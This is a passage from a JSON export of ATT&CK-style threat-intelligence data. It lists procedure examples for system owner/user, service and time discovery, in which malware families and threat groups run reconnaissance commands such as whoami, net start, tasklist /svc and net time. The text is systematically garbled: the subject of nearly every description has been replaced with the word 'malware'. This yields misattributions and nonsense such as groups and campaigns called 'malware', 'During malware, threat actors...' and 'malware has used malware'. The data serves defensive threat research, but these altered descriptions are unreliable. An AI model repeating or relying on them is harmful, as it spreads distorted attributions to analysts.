                "Description": "malware can gather the username from the victim\u2019s machine.[122]"
            },
            "S0084": {
                "ID": "S0084",
                "Name": "Mis-Type",
                "Description": "malware runs tests to determine the privilege level of the compromised user.[123]"
            },
            "S0149": {
                "ID": "S0149",
                "Name": "MoonWind",
                "Description": "malware obtains the victim username.[124]"
            },
            "S0284": {
                "ID": "S0284",
                "Name": "More_eggs",
                "Description": "malware has the capability to gather the username from the victim's machine.[125][126]"
            },
            "S0256": {
                "ID": "S0256",
                "Name": "Mosquito",
                "Description": "malware runs whoami on the victim\u2019s machine.[127]"
            },
            "G0069": {
                "ID": "G0069",
                "Name": "MuddyWater",
                "Description": "malware has used malware that can collect the victim\u2019s username.[128][129]"
            },
            "S0228": {
                "ID": "S0228",
                "Name": "NanHaiShu",
                "Description": "malware collects the username from the victim.[130]"
            },
            "S0590": {
                "ID": "S0590",
                "Name": "NBTscan",
                "Description": "malware can list active users on the system.[131][132]"
            },
            "S0272": {
                "ID": "S0272",
                "Name": "NDiskMonitor",
                "Description": "malware obtains the victim username and encrypts the information to send over its C2 channel.[133]"
            },
            "S0691": {
                "ID": "S0691",
                "Name": "Neoichor",
                "Description": "malware can collect the user name from a victim's machine.[92]"
            },
            "S1106": {
                "ID": "S1106",
                "Name": "NGLite",
                "Description": "malware will run the whoami command to gather system information and return this to the command and control server.[134]"
            },
            "C0002": {
                "ID": "C0002",
                "Name": "Night Dragon",
                "Description": "During malware, threat actors used password cracking and pass-the-hash tools to discover usernames and passwords.[135]"
            },
            "S0385": {
                "ID": "S0385",
                "Name": "njRAT",
                "Description": "malware enumerates the current user during the initial infection.[136]"
            },
            "S0353": {
                "ID": "S0353",
                "Name": "NOKKI",
                "Description": "malware can collect the username from the victim\u2019s machine.[137]"
            },
            "S0644": {
                "ID": "S0644",
                "Name": "ObliqueRAT",
                "Description": "malware can check for blocklisted usernames on infected endpoints.[138]"
            },
            "S0340": {
                "ID": "S0340",
                "Name": "Octopus",
                "Description": "malware can collect the username from the victim\u2019s machine.[139]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware has run whoami on a victim.[140][141][142]"
            },
            "S0439": {
                "ID": "S0439",
                "Name": "Okrum",
                "Description": "malware can collect the victim username.[143]"
            },
            "C0012": {
                "ID": "C0012",
                "Name": "Operation CuckooBees",
                "Description": "During malware, the threat actors used the query user and whoami commands as part of their advanced reconnaissance.[144]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors enumerated sessions and users on a remote host, and identified privileged users logged into a targeted system.[145]"
            },
            "G0040": {
                "ID": "G0040",
                "Name": "Patchwork",
                "Description": "malware collected the victim username and whether it was running as admin, then sent the information to its C2 server.[146][133]"
            },
            "S0428": {
                "ID": "S0428",
                "Name": "PoetRAT",
                "Description": "malware sent username, computer name, and the previously generated UUID in reply to a \"who\" command from C2.[147]"
            },
            "S0139": {
                "ID": "S0139",
                "Name": "PowerDuke",
                "Description": "malware has commands to get the current user's name and SID.[148]"
            },
            "S0441": {
                "ID": "S0441",
                "Name": "PowerShower",
                "Description": "malware has the ability to identify the current user on the infected host.[149]"
            },
            "S0223": {
                "ID": "S0223",
                "Name": "POWERSTATS",
                "Description": "malware has the ability to identify the username on the compromised host.[150]"
            },
            "S0184": {
                "ID": "S0184",
                "Name": "POWRUNER",
                "Description": "malware may collect information about the currently logged in user by running whoami on a victim.[151]"
            },
            "S0113": {
                "ID": "S0113",
                "Name": "Prikormka",
                "Description": "A module in malware collects information from the victim about the current user name.[152]"
            },
            "S0192": {
                "ID": "S0192",
                "Name": "Pupy",
                "Description": "malware can enumerate local information for Linux hosts and find currently logged on users for Windows hosts.[153]"
            },
            "S1032": {
                "ID": "S1032",
                "Name": "PyDCrypt",
                "Description": "malware has probed victim machines with whoami and has collected the username from the machine.[154]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can identify the user name on a compromised system.[155][156]"
            },
            "S0269": {
                "ID": "S0269",
                "Name": "QUADAGENT",
                "Description": "malware gathers the victim username.[157]"
            },
            "S0262": {
                "ID": "S0262",
                "Name": "QuasarRAT",
                "Description": "malware can enumerate the username and account type.[158]"
            },
            "S0241": {
                "ID": "S0241",
                "Name": "RATANKBA",
                "Description": "malware runs the whoami and query user commands.[159]"
            },
            "S0662": {
                "ID": "S0662",
                "Name": "RCSession",
                "Description": "malware can gather system owner information, including user and administrator privileges.[160]"
            },
            "S0172": {
                "ID": "S0172",
                "Name": "Reaver",
                "Description": "malware collects the victim's username.[161]"
            },
            "S0153": {
                "ID": "S0153",
                "Name": "RedLeaves",
                "Description": "malware can obtain information about the logged on user both locally and for Remote Desktop sessions.[162]"
            },
            "S0125": {
                "ID": "S0125",
                "Name": "Remsec",
                "Description": "malware can obtain information about the current user.[163]"
            },
            "S0379": {
                "ID": "S0379",
                "Name": "Revenge RAT",
                "Description": "malware gathers the username from the system.[164]"
            },
            "S0258": {
                "ID": "S0258",
                "Name": "RGDoor",
                "Description": "malware executes the whoami on the victim\u2019s machine.[165]"
            },
            "S0433": {
                "ID": "S0433",
                "Name": "Rifdoor",
                "Description": "malware has the ability to identify the username on the compromised host.[87]"
            },
            "S0448": {
                "ID": "S0448",
                "Name": "Rising Sun",
                "Description": "malware can detect the username of the infected host.[166]"
            },
            "S0270": {
                "ID": "S0270",
                "Name": "RogueRobin",
                "Description": "malware collects the victim\u2019s username and whether that user is an admin.[167]"
            },
            "S0240": {
                "ID": "S0240",
                "Name": "ROKRAT",
                "Description": "malware can collect the username from a compromised host.[168]"
            },
            "S0148": {
                "ID": "S0148",
                "Name": "RTM",
                "Description": "malware can obtain the victim username and permissions.[169]"
            },
            "S0085": {
                "ID": "S0085",
                "Name": "S-Type",
                "Description": "malware has run tests to determine the privilege level of the compromised user.[123]"
            },
            "S1018": {
                "ID": "S1018",
                "Name": "Saint Bot",
                "Description": "malware can collect the username from a compromised host.[170]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware has collected the username from a compromised host.[171]"
            },
            "S0461": {
                "ID": "S0461",
                "Name": "SDBbot",
                "Description": "malware has the ability to identify the user on a compromised host.[78]"
            },
            "S0382": {
                "ID": "S0382",
                "Name": "ServHelper",
                "Description": "malware will attempt to enumerate the username of the victim.[172]"
            },
            "S0596": {
                "ID": "S0596",
                "Name": "ShadowPad",
                "Description": "malware has collected the username of the victim system.[173]"
            },
            "S0450": {
                "ID": "S0450",
                "Name": "SHARPSTATS",
                "Description": "malware has the ability to identify the username on the compromised host.[150]"
            },
            "S0610": {
                "ID": "S0610",
                "Name": "SideTwist",
                "Description": "malware can collect the username on a targeted system.[142]"
            },
            "G0121": {
                "ID": "G0121",
                "Name": "Sidewinder",
                "Description": "malware has used tools to identify the user of a compromised host.[174]"
            },
            "S0692": {
                "ID": "S0692",
                "Name": "SILENTTRINITY",
                "Description": "malware can gather a list of logged on users.[175]"
            },
            "S0533": {
                "ID": "S0533",
                "Name": "SLOTHFULMEDIA",
                "Description": "malware has collected the username from a victim machine.[176]"
            },
            "S1035": {
                "ID": "S1035",
                "Name": "Small Sieve",
                "Description": "malware can obtain the id of a logged in user.[177]"
            },
            "S0649": {
                "ID": "S0649",
                "Name": "SMOKEDHAM",
                "Description": "malware has used whoami commands to identify system owners.[178]"
            },
            "S1124": {
                "ID": "S1124",
                "Name": "SocGholish",
                "Description": "malware can use whoami to obtain the username from a compromised host.[179][180][181]"
            },
            "S0627": {
                "ID": "S0627",
                "Name": "SodaMaster",
                "Description": "malware can identify the username on a compromised host.[182]"
            },
            "S0615": {
                "ID": "S0615",
                "Name": "SombRAT",
                "Description": "malware can execute getinfo  to identify the username on a compromised host.[183][184]"
            },
            "S0543": {
                "ID": "S0543",
                "Name": "Spark",
                "Description": "malware has run the whoami command and has a built-in command to identify the user logged in.[185]"
            },
            "S0374": {
                "ID": "S0374",
                "Name": "SpeakUp",
                "Description": "malware uses the whoami command. [186]"
            },
            "S1030": {
                "ID": "S1030",
                "Name": "Squirrelwaffle",
                "Description": "malware can collect the user name from a compromised host.[187]"
            },
            "S0058": {
                "ID": "S0058",
                "Name": "SslMM",
                "Description": "malware sends the logged-on username to its hard-coded C2.[188]"
            },
            "S1037": {
                "ID": "S1037",
                "Name": "STARWHALE",
                "Description": "malware can gather the username from an infected host.[189][190]"
            },
            "G0038": {
                "ID": "G0038",
                "Name": "Stealth Falcon",
                "Description": "malware malware gathers the registered user and primary owner name via WMI.[191]"
            },
            "S1034": {
                "ID": "S1034",
                "Name": "StrifeWater",
                "Description": "malware can collect the user name from the victim's machine.[192]"
            },
            "S0559": {
                "ID": "S0559",
                "Name": "SUNBURST",
                "Description": "malware collected the username from a compromised host.[193][194]"
            },
            "S1064": {
                "ID": "S1064",
                "Name": "SVCReady",
                "Description": "malware can collect the username from an infected host.[195]"
            },
            "S0242": {
                "ID": "S0242",
                "Name": "SynAck",
                "Description": "malware gathers user names from infected hosts.[196]"
            },
            "S0060": {
                "ID": "S0060",
                "Name": "Sys10",
                "Description": "malware collects the account name of the logged-in user and sends it to the C2.[188]"
            },
            "S0663": {
                "ID": "S0663",
                "Name": "SysUpdate",
                "Description": "malware can collect the username from a compromised host.[197]"
            },
            "S0098": {
                "ID": "S0098",
                "Name": "T9000",
                "Description": "malware gathers and beacons the username of the logged in account during installation. It will also gather the username of running processes to determine if it is running as SYSTEM.[198]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "malware has used whoami to collect system user information.[41]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware can identify the user and groups the user belongs to on a compromised host.[199]"
            },
            "S0094": {
                "ID": "S0094",
                "Name": "Trojan.Karagany",
                "Description": "malware can gather information about the user on a compromised host.[200]"
            },
            "G0081": {
                "ID": "G0081",
                "Name": "Tropic Trooper",
                "Description": "malware used letmein to scan for saved usernames on the target system.[201]"
            },
            "S0647": {
                "ID": "S0647",
                "Name": "Turian",
                "Description": "malware can retrieve usernames.[202]"
            },
            "S0130": {
                "ID": "S0130",
                "Name": "Unknown Logger",
                "Description": "malware can obtain information about the victim usernames.[203]"
            },
            "S0275": {
                "ID": "S0275",
                "Name": "UPPERCUT",
                "Description": "malware has the capability to collect the current logged on user\u2019s username from a machine.[204]"
            },
            "S0476": {
                "ID": "S0476",
                "Name": "Valak",
                "Description": "malware can gather information regarding the user.[205]"
            },
            "S0257": {
                "ID": "S0257",
                "Name": "VERMIN",
                "Description": "malware gathers the username from the victim\u2019s machine.[206]"
            },
            "G1017": {
                "ID": "G1017",
                "Name": "Volt Typhoon",
                "Description": "malware has executed the PowerShell command Get-EventLog security -instanceid 4624 to identify associated user and computer account names.[207][208]"
            },
            "S0515": {
                "ID": "S0515",
                "Name": "WellMail",
                "Description": "malware can identify the current username on the victim system.[209]"
            },
            "S0514": {
                "ID": "S0514",
                "Name": "WellMess",
                "Description": "malware can collect the username on the victim machine to send to C2.[210]"
            },
            "S0155": {
                "ID": "S0155",
                "Name": "WINDSHIELD",
                "Description": "malware can gather the victim user name.[211]"
            },
            "G0112": {
                "ID": "G0112",
                "Name": "Windshift",
                "Description": "malware has used malware to identify the username on a compromised host.[212]"
            },
            "S0219": {
                "ID": "S0219",
                "Name": "WINERACK",
                "Description": "malware can gather information on the victim username.[84]"
            },
            "S0059": {
                "ID": "S0059",
                "Name": "WinMM",
                "Description": "malware uses NetUser-GetInfo to identify that it is running under an \"Admin\" account on the local system.[188]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware has used \"whoami\" to identify the local user and their privileges.[213]"
            },
            "S1065": {
                "ID": "S1065",
                "Name": "Woody RAT",
                "Description": "malware can retrieve a list of user accounts and usernames from an infected machine.[214]"
            },
            "S0161": {
                "ID": "S0161",
                "Name": "XAgentOSX",
                "Description": "malware contains the getInfoOSX function to return the OS X version as well as the current user.[215]"
            },
            "S0248": {
                "ID": "S0248",
                "Name": "yty",
                "Description": "malware collects the victim\u2019s username.[216]"
            },
            "S0251": {
                "ID": "S0251",
                "Name": "Zebrocy",
                "Description": "malware gets the username from the system.[217][218]"
            },
            "G0128": {
                "ID": "G0128",
                "Name": "ZIRCONIUM",
                "Description": "malware has used a tool to capture the username on a compromised host in order to register it with C2.[219]"
            },
            "S0350": {
                "ID": "S0350",
                "Name": "zwShell",
                "Description": "malware can obtain the name of the logged-in user on the victim.[135]"
            },
            "S0412": {
                "ID": "S0412",
                "Name": "ZxShell",
                "Description": "malware can collect the owner and organization information from the target workstation.[220]"
            },
            "S1013": {
                "ID": "S1013",
                "Name": "ZxxZ",
                "Description": "malware can collect the username from a compromised host.[221]"
            }
        }
    },
    "T1007": {
        "ttp_name": "System Service Discovery",
        "ttp_id": "T1007",
        "href": "/techniques/T1007",
        "tactic": "Discovery",
        "description": "Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as sc query, tasklist /svc, systemctl --type=service, and net start.Adversaries may use the information from System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
        "Procedure": {
            "G0018": {
                "ID": "G0018",
                "Name": "admin@338",
                "Description": "malware actors used the following command following exploitation of a machine with LOWBALL malware to obtain information about services: net start >> %temp%\\download[1]"
            },
            "G0006": {
                "ID": "G0006",
                "Name": "APT1",
                "Description": "malware used the commands net start and tasklist to get a listing of the services on the system.[2]"
            },
            "G0143": {
                "ID": "G0143",
                "Name": "Aquatic Panda",
                "Description": "malware has attempted to discover services for third party EDR products.[3]"
            },
            "S0638": {
                "ID": "S0638",
                "Name": "Babuk",
                "Description": "malware can enumerate all services running on a compromised host.[4]"
            },
            "S0127": {
                "ID": "S0127",
                "Name": "BBSRAT",
                "Description": "malware can query service configuration information.[5]"
            },
            "S0570": {
                "ID": "S0570",
                "Name": "BitPaymer",
                "Description": "malware can enumerate existing Windows services on the host that are configured to run as LocalSystem.[6]"
            },
            "S1070": {
                "ID": "S1070",
                "Name": "Black Basta",
                "Description": "malware can check whether the service name FAX is present.[7]"
            },
            "G0060": {
                "ID": "G0060",
                "Name": "BRONZE BUTLER",
                "Description": "malware has used TROJ_GETVERSION to discover system services.[8]"
            },
            "S0572": {
                "ID": "S0572",
                "Name": "Caterpillar WebShell",
                "Description": "malware can obtain a list of the services from a system.[9]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has used net start and net use for system service discovery.[10]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware can enumerate services on compromised hosts.[11]"
            },
            "S0244": {
                "ID": "S0244",
                "Name": "Comnie",
                "Description": "malware runs the command: net start >> %TEMP%\\info.dat on a victim.[12]"
            },
            "S0625": {
                "ID": "S0625",
                "Name": "Cuba",
                "Description": "malware can query service status using QueryServiceStatusEx function.[13]"
            },
            "S1066": {
                "ID": "S1066",
                "Name": "DarkTortilla",
                "Description": "malware can retrieve information about a compromised system's running services.[14]"
            },
            "S0024": {
                "ID": "S0024",
                "Name": "Dyre",
                "Description": "malware has the ability to identify running services on a compromised host.[15]"
            },
            "G1006": {
                "ID": "G1006",
                "Name": "Earth Lusca",
                "Description": "malware has used Tasklist to obtain information from a compromised host.[16]"
            },
            "S0081": {
                "ID": "S0081",
                "Name": "Elise",
                "Description": "malware executes net start after initial communication is made to the remote server.[17]"
            },
            "S0082": {
                "ID": "S0082",
                "Name": "Emissary",
                "Description": "malware has the capability to execute the command net start to interact with services.[18]"
            },
            "S0091": {
                "ID": "S0091",
                "Name": "Epic",
                "Description": "malware uses the tasklist /svc command to list the services on the system.[19]"
            },
            "S0049": {
                "ID": "S0049",
                "Name": "GeminiDuke",
                "Description": "malware collects information on programs and services on the victim that are configured to automatically run at startup.[20]"
            },
            "S0237": {
                "ID": "S0237",
                "Name": "GravityRAT",
                "Description": "malware has a feature to list the available services on the system.[21]"
            },
            "S0342": {
                "ID": "S0342",
                "Name": "GreyEnergy",
                "Description": "malware enumerates all Windows services.[22]"
            },
            "S1027": {
                "ID": "S1027",
                "Name": "Heyoka Backdoor",
                "Description": "malware can check if it is running as a service on a compromised host.[23]"
            },
            "S0431": {
                "ID": "S0431",
                "Name": "HotCroissant",
                "Description": "malware has the ability to retrieve a list of services on the infected host.[24]"
            },
            "S0203": {
                "ID": "S0203",
                "Name": "Hydraq",
                "Description": "malware creates a backdoor through which remote attackers can monitor services.[25][26]"
            },
            "S0398": {
                "ID": "S0398",
                "Name": "HyperBro",
                "Description": "malware can list all services and their configurations.[27]"
            },
            "G0119": {
                "ID": "G0119",
                "Name": "Indrik Spider",
                "Description": "malware has used the win32_service WMI class to retrieve a list of services from the system.[28]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can obtain running services on the victim.[29]"
            },
            "S0015": {
                "ID": "S0015",
                "Name": "Ixeshe",
                "Description": "malware can list running services.[30]"
            },
            "S0201": {
                "ID": "S0201",
                "Name": "JPIN",
                "Description": "malware can list running services.[31]"
            },
            "S0283": {
                "ID": "S0283",
                "Name": "jRAT",
                "Description": "malware can list local services.[32]"
            },
            "G0004": {
                "ID": "G0004",
                "Name": "Ke3chang",
                "Description": "malware performs service discovery using net start commands.[33]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has used an instrumentor script to gather the names of all services running on a victim's system.[34]"
            },
            "S0236": {
                "ID": "S0236",
                "Name": "Kwampirs",
                "Description": "malware collects a list of running services with the command tasklist /svc.[35]"
            },
            "S0582": {
                "ID": "S0582",
                "Name": "LookBack",
                "Description": "malware can enumerate services on the victim machine.[36]"
            },
            "S0039": {
                "ID": "S0039",
                "Name": "Net",
                "Description": "The net start command can be used in malware to find information about Windows services.[37]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware has used sc query on a victim to gather information about services.[38]"
            },
            "C0012": {
                "ID": "C0012",
                "Name": "Operation CuckooBees",
                "Description": "During malware, the threat actors used the net start command as part of their initial reconnaissance.[39]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors used the tasklist command to search for one of its backdoors.[40]"
            },
            "G0033": {
                "ID": "G0033",
                "Name": "Poseidon Group",
                "Description": "After compromising a victim, malware discovers all running services.[41]"
            },
            "S0378": {
                "ID": "S0378",
                "Name": "PoshC2",
                "Description": "malware can enumerate service and service permission information.[42]"
            },
            "S0629": {
                "ID": "S0629",
                "Name": "RainyDay",
                "Description": "malware can create and register a service for execution.[43]"
            },
            "S0241": {
                "ID": "S0241",
                "Name": "RATANKBA",
                "Description": "malware uses tasklist /svc to display running tasks.[44]"
            },
            "S0496": {
                "ID": "S0496",
                "Name": "REvil",
                "Description": "malware can enumerate active services.[45]"
            },
            "S0085": {
                "ID": "S0085",
                "Name": "S-Type",
                "Description": "malware runs the command net start on a victim.[46]"
            },
            "S1085": {
                "ID": "S1085",
                "Name": "Sardonic",
                "Description": "malware has the ability to execute the net start command.[47]"
            },
            "S0692": {
                "ID": "S0692",
                "Name": "SILENTTRINITY",
                "Description": "malware can search for modifiable services that could be used for privilege escalation.[48]"
            },
            "S0533": {
                "ID": "S0533",
                "Name": "SLOTHFULMEDIA",
                "Description": "malware has the capability to enumerate services.[49]"
            },
            "S0615": {
                "ID": "S0615",
                "Name": "SombRAT",
                "Description": "malware can enumerate services on a victim machine.[50]"
            },
            "S0559": {
                "ID": "S0559",
                "Name": "SUNBURST",
                "Description": "malware collected a list of service names that were hashed using a FNV-1a + XOR algorithm to check against similarly-hashed hardcoded blocklists.[51]"
            },
            "S0018": {
                "ID": "S0018",
                "Name": "Sykipot",
                "Description": "malware may use net start to display running services.[52]"
            },
            "S0242": {
                "ID": "S0242",
                "Name": "SynAck",
                "Description": "malware enumerates all running services.[53][54]"
            },
            "S0663": {
                "ID": "S0663",
                "Name": "SysUpdate",
                "Description": "malware can collect a list of services on a victim machine.[55]"
            },
            "S0057": {
                "ID": "S0057",
                "Name": "Tasklist",
                "Description": "malware can be used to discover services running on a system.[56]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has searched for services such as Alibaba Cloud Security's aliyun service and BMC Helix Cloud Security's bmc-agent service in order to disable them.[57]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware collects a list of install programs and services on the system\u2019s machine.[58]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware surveys a system upon check-in to discover running services and associated processes using the tasklist /svc command.[19]"
            },
            "S0386": {
                "ID": "S0386",
                "Name": "Ursnif",
                "Description": "malware has gathered information about running services.[59]"
            },
            "S0180": {
                "ID": "S0180",
                "Name": "Volgmer",
                "Description": "malware queries the system to identify existing services.[60]"
            },
            "S0219": {
                "ID": "S0219",
                "Name": "WINERACK",
                "Description": "malware can enumerate services.[61]"
            },
            "S0086": {
                "ID": "S0086",
                "Name": "ZLib",
                "Description": "malware has the ability to discover and manipulate Windows services.[46]"
            },
            "S0412": {
                "ID": "S0412",
                "Name": "ZxShell",
                "Description": "malware can check the services on the system.[62]"
            }
        }
    },
    "T1124": {
        "ttp_name": "System Time Discovery",
        "ttp_id": "T1124",
        "href": "/techniques/T1124",
        "tactic": "Discovery",
        "description": "An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or systemsetup on macOS.[1][2][3] These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.[4][5]System time information may be gathered in a number of ways, such as with Net on Windows by performing net time \\hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz.[2] In addition, adversaries can discover device uptime through functions such as GetTickCount() to determine how long it has been since the system booted up.[6]On network devices, Network Device CLI commands such as show clock detail can be used to see the current time configuration.[7]In addition, system calls \u2013 such as time() \u2013 have been used to collect the current time on Linux devices.[8] On macOS systems, adversaries may use commands such as systemsetup -gettimezone or timeIntervalSinceNow to gather current time zone information or current date and time.[9][10]This information could be useful for performing other techniques, such as executing a file with a Scheduled Task/Job[11], or to discover locality information based on time zone to assist in victim targeting (i.e. System Location Discovery). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.[12]",
        "Procedure": {
            "S0331": {
                "ID": "S0331",
                "Name": "Agent Tesla",
                "Description": "malware can collect the timestamp from the victim\u2019s machine.[13]"
            },
            "S0622": {
                "ID": "S0622",
                "Name": "AppleSeed",
                "Description": "malware can pull a timestamp from the victim's machine.[14]"
            },
            "S0373": {
                "ID": "S0373",
                "Name": "Astaroth",
                "Description": "malware collects the timestamp from the infected machine. [15]"
            },
            "S1053": {
                "ID": "S1053",
                "Name": "AvosLocker",
                "Description": "malware has checked the system time before and after encryption.[16]"
            },
            "S0344": {
                "ID": "S0344",
                "Name": "Azorult",
                "Description": "malware can collect the time zone information from the system.[17][18]"
            },
            "S1081": {
                "ID": "S1081",
                "Name": "BADHATCH",
                "Description": "malware can obtain the DATETIME and UPTIME from a compromised machine.[19]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware can collect the time on the compromised host.[20][21]"
            },
            "S0574": {
                "ID": "S0574",
                "Name": "BendyBear",
                "Description": "malware has the ability to determine local time on a compromised host.[22]"
            },
            "S0017": {
                "ID": "S0017",
                "Name": "BISCUIT",
                "Description": "malware has a command to collect the system UPTIME.[23]"
            },
            "S0268": {
                "ID": "S0268",
                "Name": "Bisonal",
                "Description": "malware can check the system time set on the infected host.[24]"
            },
            "S0657": {
                "ID": "S0657",
                "Name": "BLUELIGHT",
                "Description": "malware can collect the local time on a compromised host.[25]"
            },
            "G0060": {
                "ID": "G0060",
                "Name": "BRONZE BUTLER",
                "Description": "malware has used net time to check the local time on a target system.[26]"
            },
            "S0471": {
                "ID": "S0471",
                "Name": "build_downer",
                "Description": "malware has the ability to determine the local time to ensure malware installation only happens during the hours that the infected system is active.[27]"
            },
            "C0015": {
                "ID": "C0015",
                "Name": "C0015",
                "Description": "During malware, the threat actors used the command net view /all time to gather the local time of a compromised network.[28]"
            },
            "S0351": {
                "ID": "S0351",
                "Name": "Cannon",
                "Description": "malware can collect the current time zone information from the victim\u2019s machine.[29]"
            },
            "S0335": {
                "ID": "S0335",
                "Name": "Carbon",
                "Description": "malware uses the command net time \\127.0.0.1 to get information the system\u2019s time.[30]"
            },
            "S1043": {
                "ID": "S1043",
                "Name": "ccf32",
                "Description": "malware can determine the local time on targeted machines.[31]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has used time /t and net time \\ip/hostname for system time discovery.[32]"
            },
            "S0660": {
                "ID": "S0660",
                "Name": "Clambling",
                "Description": "malware can determine the current time.[33]"
            },
            "S0126": {
                "ID": "S0126",
                "Name": "ComRAT",
                "Description": "malware has checked the victim system's date and time to perform tasks during business hours (9 to 5, Monday to Friday).[34]"
            },
            "S0608": {
                "ID": "S0608",
                "Name": "Conficker",
                "Description": "malware uses the current UTC victim system date for domain generation and connects to time servers to determine the current date.[35][36]"
            },
            "S0115": {
                "ID": "S0115",
                "Name": "Crimson",
                "Description": "malware has the ability to determine the date and time on a compromised host.[37]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware creates a log file for capturing keylogging, clipboard, and related data using the victim host's current date for the filename.[38] malware queries victim system epoch time during execution.[38] malware captures system time information as part of automated profiling on initial installation.[39]"
            },
            "G0012": {
                "ID": "G0012",
                "Name": "Darkhotel",
                "Description": "malware malware can obtain system time from a compromised host.[40]"
            },
            "S0673": {
                "ID": "S0673",
                "Name": "DarkWatchman",
                "Description": "malware can collect time zone information and system UPTIME.[41]"
            },
            "S1033": {
                "ID": "S1033",
                "Name": "DCSrv",
                "Description": "malware can compare the current time on an infected host with a configuration value to determine when to start the encryption process.[42]"
            },
            "S0694": {
                "ID": "S0694",
                "Name": "DRATzarus",
                "Description": "malware can use the GetTickCount and GetSystemTimeAsFileTime API calls to inspect system time.[43]"
            },
            "S0554": {
                "ID": "S0554",
                "Name": "Egregor",
                "Description": "malware contains functionality to query the local/system time.[44]"
            },
            "S0091": {
                "ID": "S0091",
                "Name": "Epic",
                "Description": "malware uses the net time command  to get the system time from the machine and collect the current date and time zone information.[45]"
            },
            "S0396": {
                "ID": "S0396",
                "Name": "EvilBunny",
                "Description": "malware has used the API calls NtQuerySystemTime, GetSystemTimeAsFileTime, and GetTickCount to gather time metrics as part of its checks to see if the malware is running in a sandbox.[46]"
            },
            "S0267": {
                "ID": "S0267",
                "Name": "FELIXROOT",
                "Description": "malware gathers the time zone information from the victim\u2019s machine.[47]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "malware can check system time to help determine when changes were made to specified files.[31]"
            },
            "S0588": {
                "ID": "S0588",
                "Name": "GoldMax",
                "Description": "malware can check the current date-time value of the compromised system, comparing it to the hardcoded execution trigger and can send the current timestamp to the C2 server.[48][49]"
            },
            "S0531": {
                "ID": "S0531",
                "Name": "Grandoreiro",
                "Description": "malware can determine the time on the victim machine via IPinfo.[50]"
            },
            "S0237": {
                "ID": "S0237",
                "Name": "GravityRAT",
                "Description": "malware can obtain the date and time of a system.[51]"
            },
            "S0690": {
                "ID": "S0690",
                "Name": "Green Lambert",
                "Description": "malware can collect the date and time from a compromised host.[52][53]"
            },
            "S0417": {
                "ID": "S0417",
                "Name": "GRIFFON",
                "Description": "malware has used a reconnaissance module that can be used to retrieve the date and time of the system.[54]"
            },
            "G0126": {
                "ID": "G0126",
                "Name": "Higaisa",
                "Description": "malware used a function to gather the current time.[55]"
            },
            "S0376": {
                "ID": "S0376",
                "Name": "HOPLIGHT",
                "Description": "malware has been observed collecting system time from victim machines.[56]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware gathers the local system time from the victim\u2019s machine.[57][58]"
            },
            "S1051": {
                "ID": "S1051",
                "Name": "KEYPLUG",
                "Description": "malware can obtain the current tick count of an infected computer.[59]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "A Destover-like implant used by malware can obtain the current system time and send it to the C2 server.[60]"
            },
            "S0455": {
                "ID": "S0455",
                "Name": "Metamorfo",
                "Description": "malware uses JavaScript to get the system time.[61]"
            },
            "S0149": {
                "ID": "S0149",
                "Name": "MoonWind",
                "Description": "malware obtains the victim's current time.[62]"
            },
            "S0039": {
                "ID": "S0039",
                "Name": "Net",
                "Description": "The net time command can be used in malware to determine the local or remote system time.[63]"
            },
            "S0353": {
                "ID": "S0353",
                "Name": "NOKKI",
                "Description": "malware can collect the current timestamp of the victim's machine.[64]"
            },
            "S0439": {
                "ID": "S0439",
                "Name": "Okrum",
                "Description": "malware can obtain the date and time of the compromised system.[65]"
            },
            "S0264": {
                "ID": "S0264",
                "Name": "OopsIE",
                "Description": "malware checks to see if the system is configured with \"Daylight\" time and checks for a specific region to be set for the timezone.[66]"
            },
            "C0012": {
                "ID": "C0012",
                "Name": "Operation CuckooBees",
                "Description": "During malware, the threat actors used the net time command as part of their advanced reconnaissance.[67]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors used the time command to retrieve the current time of a compromised system.[68]"
            },
            "S0501": {
                "ID": "S0501",
                "Name": "PipeMon",
                "Description": "malware can send time zone information from a compromised host to C2.[69]"
            },
            "S0139": {
                "ID": "S0139",
                "Name": "PowerDuke",
                "Description": "malware has commands to get the time the machine was built, the time, and the time zone.[70]"
            },
            "S0238": {
                "ID": "S0238",
                "Name": "Proxysvc",
